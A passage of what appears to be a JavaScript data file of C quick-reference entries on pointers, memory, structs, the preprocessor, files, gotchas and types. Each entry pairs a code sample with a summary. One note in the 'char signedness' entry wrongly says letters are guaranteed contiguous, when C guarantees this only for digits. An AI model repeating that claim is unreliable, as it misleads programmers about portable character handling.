    aka: "how to keep a variable value between function calls",
    sum: "A static local is initialized once and keeps its value across calls.",
    code: c`int next_id(void) {
    static int id = 0;   // initialized once
    return ++id;
}

next_id();   // 1
next_id();   // 2`,
    note: "static locals are zero-initialized and live for the whole program. They are not thread-safe.",
    pop: 5,
  },

  // -------------------------------------------------------------- Pointers
  {
    title: "Declare a pointer",
    cat: "Pointers",
    tags: ["declare", "pointer", "ptr", "address", "reference", "star", "variable"],
    aka: "how to declare a pointer to an int",
    sum: "A pointer stores the address of another object.",
    code: c`int x = 42;
int *p = &x;      // p points at x

printf("%p\n", (void *)p);`,
    note: "The * belongs to the variable: int *p, *q declares two pointers.",
    pop: 9,
  },
  {
    title: "Dereference a pointer",
    cat: "Pointers",
    tags: ["dereference", "pointer", "star", "read", "write", "value", "access"],
    aka: "how to get or change the value a pointer points to",
    sum: "*p reads or writes the pointed-to object.",
    code: c`int x = 42;
int *p = &x;

printf("%d\n", *p);   // 42
*p = 7;               // x is now 7

printf("%d\n", x);    // 7`,
    pop: 8,
  },
  {
    title: "NULL pointer",
    cat: "Pointers",
    tags: ["null", "pointer", "nullptr", "check", "zero", "invalid", "crash"],
    aka: "how to check if a pointer is null",
    sum: "NULL means “points at nothing”. Check before dereferencing.",
    code: c`int *p = NULL;

if (p != NULL) {
    printf("%d\n", *p);
}

free(p);   // freeing NULL is allowed and does nothing`,
    note: "Dereferencing NULL is undefined behavior, usually a crash. Initialize pointers.",
    pop: 7,
  },
  {
    title: "Pointer arithmetic",
    cat: "Pointers",
    tags: ["pointer", "arithmetic", "offset", "increment", "array", "address", "walk"],
    aka: "how does pointer plus one work",
    sum: "Adding 1 moves by one element, not one byte.",
    code: c`int a[] = {10, 20, 30};
int *p = a;

printf("%d\n", *p);        // 10
printf("%d\n", *(p + 1));  // 20

p++;                        // now points at 20`,
    note: "Only pointer arithmetic within the same array (or one past the end) is defined.",
    pop: 7,
  },
  {
    title: "Pointer to a pointer",
    cat: "Pointers",
    tags: ["double", "pointer", "pointer to pointer", "level", "star", "out", "parameter"],
    aka: "what is int ** and when do i need it",
    sum: "A pointer that stores the address of another pointer.",
    code: c`int x = 5;
int *p = &x;
int **pp = &p;

**pp = 10;   // x is now 10

// useful for functions that replace the caller's pointer:
void alloc(int **out) {
    *out = malloc(sizeof **out);
}`,
    note: "Common in out-parameters and arrays of strings (char **argv).",
    pop: 5,
  },
  {
    title: "const and pointers",
    cat: "Pointers",
    tags: ["const", "pointer", "readonly", "const pointer", "modify", "safety"],
    aka: "difference between const int pointer and int const pointer",
    sum: "const can protect the pointee, the pointer, or both.",
    code: c`const int *a = &x;         // cannot change *a
int *const b = &x;         // cannot change b
const int *const c = &x;   // cannot change either`,
    note: "Read right to left: const int * means pointer to const int.",
    pop: 4,
  },
  {
    title: "void pointer",
    cat: "Pointers",
    tags: ["void", "pointer", "generic", "cast", "any", "type", "malloc"],
    aka: "what is a void pointer used for",
    sum: "void * holds any object address; cast it before dereferencing.",
    code: c`int x = 42;
void *p = &x;

int *ip = (int *)p;
printf("%d\n", *ip);   // 42

void *mem = malloc(16); // malloc returns void *`,
    note: "Pointer arithmetic on void * is not standard C. Cast to char * first.",
    pop: 5,
  },
  {
    title: "Array vs pointer",
    cat: "Pointers",
    tags: ["array", "pointer", "decay", "difference", "sizeof", "address", "char", "character"],
    aka: "difference between a char array and a pointer why does sizeof give a different answer in a function",
    sum: "An array decays to a pointer in most expressions, but not in sizeof.",
    code: c`int a[3] = {1, 2, 3};
int *p = a;        // a decays to &a[0]

printf("%zu\n", sizeof a);   // 12 (3 ints)
printf("%zu\n", sizeof p);   // 8 (a pointer)`,
    note: "a[i] is defined as *(a + i), which is why both syntaxes work.",
    pop: 7,
  },
  {
    title: "Function pointer",
    cat: "Pointers",
    tags: ["function", "pointer", "callback", "function pointer", "dispatch", "table"],
    aka: "how to store a function in a variable or pass it as a callback",
    sum: "Pointers can hold functions with a matching signature.",
    code: c`int add(int a, int b) { return a + b; }
int sub(int a, int b) { return a - b; }

int (*op)(int, int) = add;
printf("%d\n", op(6, 2));   // 8

op = sub;
printf("%d\n", op(6, 2));   // 4`,
    note: "The parentheses around *op are required: int (*op)(int, int).",
    pop: 5,
  },

  // ---------------------------------------------------------------- Memory
  {
    title: "malloc",
    cat: "Memory",
    tags: ["malloc", "allocate", "alloc", "memory", "heap", "dynamic", "size"],
    aka: "how to allocate memory dynamically allocating memory",
    sum: "Allocate uninitialized bytes from the heap.",
    code: c`#include <stdlib.h>

size_t n = 10;
int *nums = malloc(n * sizeof *nums);

if (nums == NULL) {
    // allocation failed
}`,
    note: "sizeof *nums stays correct if the type ever changes. malloc does not zero the memory.",
    pop: 10,
  },
  {
    title: "calloc",
    cat: "Memory",
    tags: ["calloc", "allocate", "zero", "initialize", "memory", "heap", "array"],
    aka: "how to allocate zeroed memory",
    sum: "Allocate and zero-fill memory for an array.",
    code: c`size_t n = 10;
int *zeros = calloc(n, sizeof *zeros);

if (zeros == NULL) {
    // allocation failed
}`,
    note: "calloc(n, size) multiplies n by size for you and initializes every byte to 0.",
    pop: 6,
  },
  {
    title: "realloc",
    cat: "Memory",
    tags: ["realloc", "resize", "grow", "shrink", "memory", "array", "heap"],
    aka: "how to make an allocated array bigger",
    sum: "Resize a heap allocation, preserving its contents.",
    code: c`int *bigger = realloc(nums, new_n * sizeof *nums);

if (bigger == NULL) {
    free(nums);   // original is still valid
    return;
}

nums = bigger;`,
    note: "Do not assign straight back to nums: on failure you would lose the original pointer and leak it.",
    pop: 7,
  },
  {
    title: "free",
    cat: "Memory",
    tags: ["free", "deallocate", "release", "delete", "memory", "heap", "cleanup"],
    aka: "how to free allocated memory",
    sum: "Return heap memory when you are done with it.",
    code: c`int *nums = malloc(10 * sizeof *nums);
// ...
free(nums);
nums = NULL;   // prevents accidental reuse`,
    note: "Free exactly once. Freeing NULL is allowed; double-free and use-after-free are not.",
    pop: 9,
  },
  {
    title: "Check allocation failure",
    cat: "Memory",
    tags: ["malloc", "check", "null", "error", "failure", "allocation", "out of memory"],
    aka: "what to do if malloc returns null",
    sum: "Every allocation can fail. Check before using it.",
    code: c`void *p = malloc(size);

if (p == NULL) {
    perror("malloc");
    exit(EXIT_FAILURE);
}`,
    note: "perror prints your message plus the current errno description.",
    pop: 5,
  },
  {
    title: "Allocate a struct or array",
    cat: "Memory",
    tags: ["malloc", "struct", "array", "sizeof", "allocate", "heap", "dynamically"],
    aka: "how to allocate an array of structs on the heap",
    sum: "Use sizeof *ptr so the size tracks the type.",
    code: c`typedef struct { int x, y; } Point;

Point *p = malloc(sizeof *p);
Point *points = malloc(count * sizeof *points);

free(p);
free(points);`,
    note: "malloc returns memory aligned for any type, so it is safe for structs.",
    pop: 5,
  },
  {
    title: "Zero memory (memset)",
    cat: "Memory",
    tags: ["memset", "zero", "clear", "memory", "struct", "array", "bytes"],
    aka: "how to zero an array or struct",
    sum: "memset fills bytes. All-bits-zero means 0 for integers and NULL for pointers.",
    code: c`#include <string.h>

int a[10];
memset(a, 0, sizeof a);

struct Point p;
memset(&p, 0, sizeof p);`,
    note: "memset sets each byte. memset(a, 1, sizeof a) does not set each int to 1.",
    pop: 5,
  },
  {
    title: "Stack vs heap",
    cat: "Memory",
    tags: ["stack", "heap", "memory", "lifetime", "scope", "local", "dynamic", "allocation"],
    aka: "difference between stack and heap memory",
    sum: "Stack is automatic and scoped; heap lives until freed.",
    code: c`void f(void) {
    int local[100];                    // stack: gone when f returns

    int *heap = malloc(100 * sizeof *heap);  // heap: until free
    // ...
    free(heap);
}`,
    note: "Returning a pointer to a local array is a classic dangling-pointer bug.",
    pop: 5,
  },

  // --------------------------------------------------------------- Structs
  {
    title: "Define a struct",
    cat: "Structs",
    tags: ["struct", "define", "record", "fields", "members", "object", "data"],
    aka: "how to create a struct with fields",
    sum: "Group related values under one type.",
    code: c`struct Point {
    int x;
    int y;
};

struct Point p = {1, 2};
printf("%d, %d\n", p.x, p.y);`,
    note: "A struct definition ending in } needs a semicolon.",
    pop: 9,
  },
  {
    title: "typedef struct",
    cat: "Structs",
    tags: ["typedef", "struct", "alias", "shorter", "name", "define"],
    aka: "how to avoid writing struct every time",
    sum: "Name the struct type once, then use it without the struct keyword.",
    code: c`typedef struct {
    int x;
    int y;
} Point;

Point p = {.x = 1, .y = 2};`,
    note: "You can also write typedef struct Point Point; to keep a self-referential tag.",
    pop: 7,
  },
  {
    title: "Struct pointer and ->",
    cat: "Structs",
    tags: ["struct", "pointer", "arrow", "access", "member", "dereference"],
    aka: "how to access struct fields through a pointer",
    sum: "ptr->field is shorthand for (*ptr).field.",
    code: c`Point p = {1, 2};
Point *ptr = &p;

printf("%d\n", ptr->x);   // same as (*ptr).x
ptr->y = 10;`,
    pop: 8,
  },
  {
    title: "Nested struct",
    cat: "Structs",
    tags: ["nested", "struct", "inside", "member", "rect", "point"],
    aka: "how to put a struct inside another struct",
    sum: "A struct member can itself be a struct.",
    code: c`typedef struct { int x, y; } Point;

typedef struct {
    Point top_left;
    Point bottom_right;
} Rect;

Rect r = {{0, 0}, {10, 5}};
printf("%d\n", r.bottom_right.y);`,
    pop: 4,
  },
  {
    title: "Array of structs",
    cat: "Structs",
    tags: ["array", "struct", "list", "records", "table", "initialize"],
    aka: "how to make a list of structs",
    sum: "An array whose elements are structs.",
    code: c`typedef struct { int x, y; } Point;

Point pts[3] = {
    {1, 2},
    {3, 4},
    {5, 6},
};

for (size_t i = 0; i < 3; i++) {
    printf("%d\n", pts[i].x);
}`,
    pop: 6,
  },
  {
    title: "Pass a struct to a function",
    cat: "Structs",
    tags: ["pass", "struct", "function", "pointer", "copy", "parameter"],
    aka: "should i pass a struct by value or pointer",
    sum: "Pass by value for small structs; pass a pointer for big or mutable ones.",
    code: c`void move(Point *p, int dx, int dy) {
    p->x += dx;
    p->y += dy;
}

Point p = {0, 0};
move(&p, 2, 3);`,
    note: "Passing by value copies the whole struct, which can be expensive.",
    pop: 5,
  },
  {
    title: "union",
    cat: "Structs",
    tags: ["union", "overlap", "memory", "variant", "shared", "members"],
    aka: "what is a union in c",
    sum: "All members share the same memory; only one is valid at a time.",
    code: c`union Value {
    int i;
    float f;
    unsigned char bytes[4];
};

union Value v;
v.i = 42;
printf("%zu\n", sizeof v);   // size of its largest member`,
    note: "Read back the same member you wrote. Type punning through a union is not portable.",
    pop: 5,
  },

  // ---------------------------------------------------------- Preprocessor
  {
    title: "Define a constant with #define",
    cat: "Preprocessor",
    tags: ["define", "constant", "macro", "preprocessor", "literal", "max"],
    aka: "how to define a constant macro",
    sum: "The preprocessor replaces the name with text before compiling.",
    code: c`#define MAX_USERS 100
#define APP_NAME "quickref"

int users[MAX_USERS];`,
    note: "No = and no trailing semicolon. Prefer const when you need a type or scope.",
    pop: 7,
  },
  {
    title: "Macro with arguments",
    cat: "Preprocessor",
    tags: ["macro", "function", "arguments", "define", "square", "max", "preprocessor"],
    aka: "how to write a function like macro",
    sum: "Parenthesize every parameter and the whole body.",
    code: c`#define SQUARE(x) ((x) * (x))
#define MAX(a, b) ((a) > (b) ? (a) : (b))

int n = SQUARE(3 + 1);   // 16, not 7`,
    note: "Macros are text substitution. Prefer static inline functions unless you need generics.",
    pop: 6,
  },
  {
    title: "Include guards",
    cat: "Preprocessor",
    tags: ["include", "guard", "header", "once", "pragma", "multiple", "definition"],
    aka: "how to stop a header being included twice",
    sum: "Wrap the header in an #ifndef guard, or use #pragma once.",
    code: c`#ifndef MY_HEADER_H
#define MY_HEADER_H

// declarations

#endif // MY_HEADER_H`,
    note: "#pragma once is widely supported but not part of the C standard.",
    pop: 5,
  },
  {
    title: "Conditional compilation",
    cat: "Preprocessor",
    tags: ["ifdef", "ifndef", "if", "debug", "conditional", "compile", "version"],
    aka: "how to compile code only in debug mode",
    sum: "Include or exclude code at compile time with #if.",
    code: c`#ifdef DEBUG
    printf("x = %d\n", x);
#endif

#if __STDC_VERSION__ >= 201112L
    // C11 or later
#endif`,
    note: "#ifdef tests whether a macro is defined; #if evaluates a constant expression.",
    pop: 5,
  },
  {
    title: "Predefined macros",
    cat: "Preprocessor",
    tags: ["file", "line", "func", "debug", "macro", "log", "predefined"],
    aka: "how to log the current file and line number",
    sum: "__FILE__, __LINE__, and __func__ help with debugging.",
    code: c`printf("file: %s\n", __FILE__);
printf("line: %d\n", __LINE__);
printf("func: %s\n", __func__);

#define LOG(msg) printf("%s:%d: %s\n", __FILE__, __LINE__, msg)`,
    note: "__func__ is a predefined identifier, not a macro.",
  },

  // ----------------------------------------------------------------- Files
  {
    title: "Open and close a file",
    cat: "Files",
    tags: ["file", "fopen", "fclose", "open", "close", "read", "write", "stream"],
    aka: "how to open a file in c",
    sum: "fopen returns a FILE *, or NULL on failure.",
    code: c`FILE *f = fopen("data.txt", "r");

if (f == NULL) {
    perror("data.txt");
    return 1;
}

// ...

fclose(f);`,
    note: "Modes: r read, w write/truncate, a append, r+ read/write, b binary (rb, wb).",
    pop: 9,
  },
  {
    title: "Read a file line by line",
    cat: "Files",
    tags: ["read", "file", "line", "fgets", "loop", "text", "input"],
    aka: "how to read a text file line by line",
    sum: "fgets returns NULL at end of file or on error.",
    code: c`char line[256];
FILE *f = fopen("data.txt", "r");

if (f == NULL) {
    perror("data.txt");
    return 1;
}

while (fgets(line, sizeof line, f)) {
    printf("%s", line);
}

fclose(f);`,
    note: "Each line may include a trailing newline. Use feof only after a read fails.",
    pop: 8,
  },
  {
    title: "Write to a file",
    cat: "Files",
    tags: ["write", "file", "fprintf", "fputs", "fwrite", "output", "save"],
    aka: "how to write text to a file",
    sum: "fprintf and fputs write text; fwrite writes raw bytes.",
    code: c`FILE *f = fopen("out.txt", "w");

if (f == NULL) {
    perror("out.txt");
    return 1;
}

fprintf(f, "x = %d\n", x);
fputs("done\n", f);

fclose(f);`,
    note: "Opening with \"w\" erases the existing file. Use \"a\" to append.",
    pop: 7,
  },
  {
    title: "Print to stderr",
    cat: "Files",
    tags: ["stderr", "error", "print", "fprintf", "perror", "diagnostic", "output"],
    aka: "how to print an error message",
    sum: "Write diagnostics to stderr so they are separate from normal output.",
    code: c`fprintf(stderr, "error: %s\n", msg);

perror("open");   // adds the system error text`,
    note: "perror writes to stderr and uses errno from the last failed call.",
    pop: 5,
  },
  {
    title: "Read a whole binary file",
    cat: "Files",
    tags: ["binary", "file", "read", "fread", "fseek", "ftell", "buffer", "size"],
    aka: "how to read an entire file into memory",
    sum: "Seek to the end to get the size, then read it all.",
    code: c`FILE *f = fopen("data.bin", "rb");
fseek(f, 0, SEEK_END);
long size = ftell(f);
rewind(f);

char *buf = malloc(size);
fread(buf, 1, size, f);

fclose(f);
free(buf);`,
    note: "Check that fopen, fseek, and malloc succeeded. size is in bytes.",
    pop: 6,
  },
  {
    title: "Check file errors",
    cat: "Files",
    tags: ["file", "error", "ferror", "perror", "errno", "check", "fail"],
    aka: "how to handle file errors",
    sum: "Check fopen, ferror, and fclose return values.",
    code: c`FILE *f = fopen("data.txt", "r");
if (f == NULL) {
    perror("data.txt");
    return 1;
}

if (ferror(f)) {
    perror("read");
}

if (fclose(f) != 0) {
    perror("close");
}`,
    note: "errno is only meaningful right after a failed library call.",
    pop: 5,
  },

  // --------------------------------------------------------------- Gotchas
  {
    title: "= vs ==",
    cat: "Gotchas",
    tags: ["assignment", "comparison", "equals", "equal", "bug", "if", "warning"],
    aka: "why is my if always true assignment instead of comparison",
    sum: "= assigns; == compares. In a condition, an assignment is usually a bug.",
    code: c`if (x = 5) {   }   // assigns 5, then tests it (always true)
if (x == 5) {  }   // compares

// -Wall warns about this:
// warning: suggest parentheses around assignment used as truth value`,
    note: "Compiling with -Wall catches most accidental assignments in conditions.",
    pop: 8,
  },
  {
    title: "Integer division",
    cat: "Gotchas",
    tags: ["division", "integer", "truncate", "float", "average", "bug", "math"],
    aka: "why does 7/2 equal 3",
    sum: "int / int truncates toward zero. Cast if you want a fraction.",
    code: c`int a = 7 / 2;          // 3
double b = 7 / 2;       // 3.0 — still integer division
double c = 7 / 2.0;     // 3.5
double d = (double)7 / 2; // 3.5`,
    note: "This is one of the most common beginner bugs in C.",
    pop: 8,
  },
  {
    title: "Buffer overflow with scanf",
    cat: "Gotchas",
    tags: ["scanf", "overflow", "buffer", "security", "string", "safe", "width"],
    aka: "why is scanf unsafe for strings",
    sum: "Unbounded %s writes past the end of the array.",
    code: c`char name[32];

scanf("%31s", name);   // width = buffer size - 1

// safer for lines:
fgets(name, sizeof name, stdin);`,
    note: "fgets also reads spaces and bounds the write to the buffer size.",
    pop: 7,
  },
  {
    title: "Uninitialized variables",
    cat: "Gotchas",
    tags: ["uninitialized", "garbage", "undefined", "local", "variable", "zero"],
    aka: "why does my variable have a random value",
    sum: "Local variables are not zeroed. Reading one before assignment is UB.",
    code: c`int x;
printf("%d\n", x);   // undefined behavior

int y = 0;           // initialize it
int z[10] = {0};     // arrays too`,
    note: "Globals and static locals are zero-initialized; automatic locals are not.",
    pop: 8,
  },
  {
    title: "Off-by-one",
    cat: "Gotchas",
    tags: ["off", "by", "one", "index", "bounds", "array", "loop", "last"],
    aka: "why does my array loop crash at the last element",
    sum: "The valid indexes are 0 through n - 1.",
    code: c`int a[5];

for (int i = 0; i <= 5; i++)   // bad: writes a[5]
    a[i] = 0;

for (int i = 0; i < 5; i++)    // good
    a[i] = 0;`,
    note: "Use < n, not <= n. The compiler will not catch this for you.",
    pop: 7,
  },
  {
    title: "Returning a local pointer",
    cat: "Gotchas",
    tags: ["dangling", "pointer", "return", "local", "stack", "lifetime", "bug"],
    aka: "why is my returned pointer garbage",
    sum: "A local variable dies when the function returns.",
    code: c`int *bad(void) {
    int x = 42;
    return &x;      // dangling pointer
}

int *good(void) {
    int *p = malloc(sizeof *p);
    if (p) *p = 42;
    return p;       // caller must free
}`,
    note: "Return a heap pointer, a static buffer, or write into a caller-provided buffer.",
    pop: 6,
  },
  {
    title: "Modifying a string literal",
    cat: "Gotchas",
    tags: ["string", "literal", "modify", "segfault", "readonly", "const", "char"],
    aka: "why does changing a string literal crash",
    sum: "String literals are read-only; copy into an array to modify.",
    code: c`char *s = "hello";
s[0] = 'H';       // undefined behavior (often a crash)

char t[] = "hello";
t[0] = 'H';       // fine — t is a writable copy`,
    note: "Prefer const char * for literals so the compiler stops you.",
    pop: 7,
  },
  {
    title: "sizeof a pointer",
    cat: "Gotchas",
    tags: ["sizeof", "pointer", "array", "decay", "function", "size", "bug"],
    aka: "why is sizeof inside a function wrong",
    sum: "Inside a function, an array parameter is just a pointer.",
    code: c`void f(int a[10]) {
    printf("%zu\n", sizeof a);   // 8, not 40
}

void g(void) {
    int a[10];
    printf("%zu\n", sizeof a);   // 40
}`,
    note: "Pass the element count as a separate parameter.",
    pop: 6,
  },
  {
    title: "Use after free",
    cat: "Gotchas",
    tags: ["use", "after", "free", "dangling", "heap", "undefined", "bug"],
    aka: "what happens if i use memory after freeing it",
    sum: "After free, the pointer is invalid. Reading or writing it is UB.",
    code: c`int *p = malloc(sizeof *p);
*p = 5;
free(p);

*p = 10;        // use-after-free: undefined behavior
p = NULL;       // good habit after free`,
    note: "AddressSanitizer (-fsanitize=address) reports most use-after-free bugs.",
    pop: 6,
  },
  {
    title: "Undefined behavior",
    cat: "Gotchas",
    tags: ["undefined", "behavior", "ub", "compiler", "unsequenced", "bug", "sanitizer"],
    aka: "what is undefined behavior in c",
    sum: "The standard places no requirements on the result. Anything can happen.",
    code: c`int i = 0;
i = i++ + ++i;   // UB: unsequenced reads and writes

int x = 5;
x = x++;         // UB

int a[3];
a[5] = 1;        // out of bounds: UB`,
    note: "Use -fsanitize=undefined,address during development to catch many cases.",
    pop: 7,
  },

  // ------------------------------------------------ expanded reference
  {
    title: "C standard versions",
    cat: "Basics",
    tags: ["standard", "version", "c89", "c99", "c11", "c17", "c23", "std", "dialect", "iso"],
    aka: "which c standard should i use c99 or c11",
    sum: "Pick a standard explicitly with -std=. C17 is a safe default; C23 adds new keywords.",
    code: c`gcc -std=c17 main.c -o main
gcc -std=c2x main.c -o main   // pre-release C23
clang -std=c23 main.c -o main

// check the version from inside the program:
#if __STDC_VERSION__ >= 201112L
// C11 or newer
#endif`,
    note: "C23 is ISO/IEC 9899:2024. GCC 14+ and Clang 18+ accept -std=c23; older compilers use -std=c2x.",
    pop: 5,
  },
  {
    title: "Compiler warnings",
    cat: "Basics",
    tags: ["warnings", "wall", "wextra", "werror", "pedantic", "diagnostics", "lint", "compile"],
    aka: "how do i turn on all compiler warnings",
    sum: "Turn warnings on, and treat them as errors while developing.",
    code: c`gcc -std=c17 -Wall -Wextra -Wpedantic -Wconversion \
    -Wshadow -Wformat=2 -Werror main.c -o main

clang -std=c17 -Weverything main.c -o main   // very noisy`,
    note: "Fix warnings before debugging behavior. -Wconversion catches silent narrowing; -Werror keeps them from piling up.",
    pop: 6,
  },
  {
    title: "Operator precedence",
    cat: "Basics",
    tags: ["precedence", "order", "operators", "parentheses", "expression", "evaluation", "binding"],
    aka: "which operator runs first order of operations",
    sum: "Unary binds tightest, then arithmetic, shifts, comparisons, bitwise, logical, assignment, comma.",
    code: c`a + b * c          // * before +
!flag && ready     // ! before &&
x & 0xF == 0xF     // parsed as x & (0xF == 0xF) — surprising
*p++               // *(p++), not (*p)++
a = b = 0          // right-associative

// when in doubt:
x = (a + b) * c;`,
    note: "Assignment is right-associative and comma is the lowest. Parentheses cost nothing and prevent most precedence bugs.",
    pop: 6,
  },
  {
    title: "Increment and decrement",
    cat: "Basics",
    tags: ["increment", "decrement", "plusplus", "minusminus", "pre", "post", "++", "--"],
    aka: "difference between i++ and ++i",
    sum: "Pre-increment changes the value first; post-increment yields the old value.",
    code: c`int i = 5;
int a = ++i;   // i becomes 6, a is 6
int j = 5;
int b = j++;   // b is 5, j becomes 6

int arr[3] = {10, 20, 30};
int *p = arr;
printf("%d\n", *p++);   // 10, then p moves to arr[1]`,
    note: "Do not modify the same variable twice in one expression: i = i++ is undefined behavior.",
    pop: 6,
  },
  {
    title: "Short-circuit evaluation",
    cat: "Basics",
    tags: ["short", "circuit", "and", "or", "logical", "lazy", "evaluation", "guard"],
    aka: "does && stop evaluating if the first is false",
    sum: "&& and || evaluate left to right and stop as soon as the result is known.",
    code: c`if (p != NULL && p->value > 0) {
    // safe: p->value is only read when p is non-NULL
}

if (count == 0 || total / count > 10) {
    // division is skipped when count is 0
}`,
    note: "Put the cheap or safety-critical check first. Do not rely on short-circuiting for side effects.",
    pop: 7,
  },
  {
    title: "Comma operator",
    cat: "Basics",
    tags: ["comma", "operator", "sequence", "expression", "for", "multiple"],
    aka: "what does a comma operator do",
    sum: "Evaluate the left expression, discard it, then evaluate and return the right one.",
    code: c`for (int i = 0, j = n - 1; i < j; i++, j--) {
    swap(&a[i], &a[j]);
}

int x = (a = 1, b = 2, a + b);   // x is 3`,
    note: "In function arguments, commas separate arguments — that is not the comma operator. Prefer separate statements outside for loops.",
  },
  {
    title: "Implicit conversions",
    cat: "Basics",
    tags: ["conversion", "promotion", "implicit", "cast", "integer", "arithmetic", "narrowing", "usual"],
    aka: "why does integer division happen type promotion rules",
    sum: "Operands are promoted before arithmetic; narrowing conversions can silently lose data.",
    code: c`int i = 3.9;          // i is 3 (truncated)
double d = 7 / 2;     // 3.0, because 7 / 2 is integer division
double e = 7 / 2.0;   // 3.5

char c = 'A';
int code = c;         // char promotes to int
unsigned u = -1;      // wraps to UINT_MAX

// make the intent explicit:
double f = (double)7 / 2;`,
    note: "The usual arithmetic conversions pick a common type. Compile with -Wconversion to catch narrowing assignments.",
    pop: 6,
  },
  {
    title: "sizeof an array",
    cat: "Basics",
    tags: ["sizeof", "array", "length", "count", "elements", "bytes", "size"],
    aka: "how many elements are in this array",
    sum: "Divide the total size by the size of one element — while the array type is still visible.",
    code: c`int a[10];
size_t n = sizeof a / sizeof a[0];   // 10

char text[] = "hello";
size_t bytes = sizeof text;          // 6: five chars plus '\0'`,
    note: "This fails inside a function where the array has decayed to a pointer. Pass the length as a separate parameter.",
    pop: 7,
  },
  {
    title: "Multiple source files",
    cat: "Basics",
    tags: ["multiple", "files", "header", "project", "link", "compile", "multifile", "modules"],
    aka: "how to split a c program into multiple files",
    sum: "Declare shared functions in a header, define them in one .c file, compile all .c files together.",
    code: c`// math_utils.h
#ifndef MATH_UTILS_H
#define MATH_UTILS_H
int add(int a, int b);
#endif

// math_utils.c
#include "math_utils.h"
int add(int a, int b) { return a + b; }

// main.c
#include <stdio.h>
#include "math_utils.h"
int main(void) {
    printf("%d\n", add(2, 3));
    return 0;
}

// build:
// gcc main.c math_utils.c -o app`,
    note: "Headers hold declarations, .c files hold definitions. Never define the same function in two files.",
    pop: 5,
  },
  {
    title: "Scope and lifetime",
    cat: "Basics",
    tags: ["scope", "lifetime", "block", "local", "global", "static", "storage", "visibility"],
    aka: "where can i use this variable how long does it live",
    sum: "Block scope ends at the closing brace; static storage lasts for the whole program.",
    code: c`int global = 1;          // file scope, static lifetime

void f(void) {
    int local = 2;       // block scope, automatic lifetime
    for (int i = 0; i < 3; i++) {
        // i exists only inside this loop
    }
    {
        int inner = 3;   // dies at the next }
    }
    static int calls;    // block scope, static lifetime
    calls++;
}`,
    note: "An inner declaration can shadow an outer one. Use -Wshadow to find accidental shadowing.",
    pop: 4,
  },
  {
    title: "extern and global variables",
    cat: "Basics",
    tags: ["extern", "global", "linkage", "shared", "variable", "header", "multifile"],
    aka: "how to share a global variable between files",
    sum: "Define the variable once in a .c file; declare it extern in the header.",
    code: c`// config.h
extern int debug_level;

// config.c
#include "config.h"
int debug_level = 0;

// main.c
#include "config.h"
int main(void) {
    debug_level = 2;
    return 0;
}`,
    note: "A definition allocates storage; extern only refers to it. A static file-scope variable stays private to its .c file.",
    pop: 4,
  },
  {
    title: "Reserved identifiers",
    cat: "Basics",
    tags: ["reserved", "identifier", "names", "underscore", "naming", "keyword", "collision"],
    aka: "can i start a variable name with underscore",
    sum: "Names with two underscores, or an underscore and a capital, are reserved for the implementation.",
    code: c`int _Count;    // reserved: underscore + uppercase
int __value;   // reserved: double underscore
int my_count;  // fine
int count2;    // fine

// also avoid standard names such as index, y1, or
// names beginning with str, mem, or is`,
    note: "Do not redefine keywords or standard library names. The compiler will not always warn about reserved names.",
  },
  {
    title: "Numeric literals",
    cat: "Basics",
    tags: ["literal", "number", "hex", "octal", "binary", "suffix", "float", "constant", "base"],
    aka: "how to write hexadecimal octal binary numbers",
    sum: "Prefixes choose the base; suffixes choose the type. A leading zero means octal.",
    code: c`int dec = 42;
int oct = 052;        // 42 — leading zero means octal!
int hex = 0x2A;       // 42
int bin = 0b101010;   // 42 (C23; GCC/Clang accept it earlier)

long big = 42L;
unsigned u = 42U;
long long huge = 42LL;
float f = 3.14f;
long double ld = 3.14L;
double sci = 1e6;
double hexfloat = 0x1p3;   // 8.0 (C99)`,
    note: "Use uppercase 0X and L suffixes to avoid confusion. Binary literals became standard in C23.",
    pop: 4,
  },

  {
    title: "short, long, and long long",
    cat: "Types",
    tags: ["short", "long", "longlong", "integer", "size", "range", "types"],
    aka: "what is the difference between int long and short",
    sum: "They change the minimum range, not an exact width. Use stdint.h when width matters.",
    code: c`short s = -32768;              // at least 16 bits
int i = 100000;                // at least 16, usually 32
long l = 123456789L;           // at least 32
long long ll = 9223372036854775807LL; // at least 64

unsigned short us = 65535u;
unsigned long long ull = 18446744073709551615ULL;`,
    note: "Sizes are implementation-defined. Print long with %ld, long long with %lld, unsigned long long with %llu.",
    pop: 6,
  },
  {
    title: "Integer limits",
    cat: "Types",
    tags: ["limits", "min", "max", "int_max", "range", "overflow", "limits.h", "climits"],
    aka: "what is the maximum value of int",
    sum: "limits.h defines the minimum and maximum of every integer type.",
    code: c`#include <limits.h>
#include <stdio.h>

printf("%d\n", INT_MAX);     // usually 2147483647
printf("%d\n", INT_MIN);
printf("%u\n", UINT_MAX);
printf("%ld\n", LONG_MAX);
printf("%lld\n", LLONG_MAX);
printf("%d\n", CHAR_BIT);    // bits per byte, usually 8
printf("%d\n", CHAR_MIN);`,
    note: "These are compile-time constants. Use them instead of hard-coding 2147483647.",
    pop: 5,
  },
  {
    title: "size_t and ptrdiff_t",
    cat: "Types",
    tags: ["size_t", "ptrdiff_t", "unsigned", "size", "index", "difference", "stddef"],
    aka: "what type should array sizes and indexes use",
    sum: "size_t is the unsigned type for sizes; ptrdiff_t is the signed type for pointer differences.",
    code: c`#include <stddef.h>
#include <string.h>

size_t n = strlen(text);
for (size_t i = 0; i < n; i++) {
    putchar(text[i]);
}

ptrdiff_t d = end - start;   // signed element count
printf("%zu %td\n", n, d);`,
    note: "Never assign size_t to int without checking. Use %zu for size_t and %td for ptrdiff_t.",
    pop: 6,
  },
  {
    title: "char signedness and ASCII",
    cat: "Types",
    tags: ["char", "signed", "unsigned", "ascii", "byte", "character", "encoding", "code"],
    aka: "is char signed or unsigned what is the ascii value",
    sum: "char is an integer type; whether it is signed is implementation-defined.",
    code: c`char c = 'A';
printf("%c %d\n", c, c);      // A 65

int code = (unsigned char)c; // safe numeric conversion

// ASCII letters are contiguous:
for (char ch = 'a'; ch <= 'z'; ch++) {
    putchar(ch);
}`,
    note: "Only digits and letters are guaranteed contiguous. Use ctype.h instead of arithmetic on characters.",
    pop: 5,
  },
  {
    title: "volatile",
    cat: "Types",
    tags: ["volatile", "qualifier", "hardware", "register", "signal", "optimization", "memory"],
    aka: "when should i use volatile",
    sum: "Tells the compiler the value can change outside the program's normal flow.",
    code: c`volatile int *status = (volatile int *)0x40000000;

while (*status == 0) {
    // hardware may change *status
}

volatile sig_atomic_t stop = 0;
// a signal handler may set stop = 1`,
    note: "volatile prevents caching in registers, but it does not make access atomic or thread-safe. Use atomics or a mutex for threads.",
    pop: 4,
  },
  {
